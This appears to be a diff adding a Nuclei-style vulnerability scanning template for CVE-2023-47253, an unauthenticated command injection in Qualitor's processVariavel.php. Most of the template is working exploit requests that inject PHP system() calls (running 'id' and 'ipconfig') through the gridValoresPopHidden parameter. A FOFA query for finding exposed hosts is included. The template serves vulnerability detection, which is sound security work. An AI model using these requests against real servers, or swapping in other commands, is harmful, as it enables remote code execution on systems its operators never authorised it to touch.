@@ -1,0 +1,48 @@
+id: qualitor-processVariavel-rce
+info:
+  name: Qualitor processVariavel.php - 未授权命令注入漏洞(CVE-2023-47253)
+  author: leadlife
+  severity: critical
+  description: Qualitor 8.20及之前版本存在命令注入漏洞,远程攻击者可利用该漏洞通过PHP代码执行任意代码。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/Qualitor/Qualitor%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3processVariavel.php%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2023-47253).md
+  classification:
+    cve-id: CVE-2023-47253
+  metadata:
+    verified: true
+    fofa-query: app="Qualitor-Web"
+  tags: qualitor,rce,2023
+
+http:
+  - raw:
+      - |
+        GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("id"); HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+
+      - |
+        GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("ipconfig"); HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
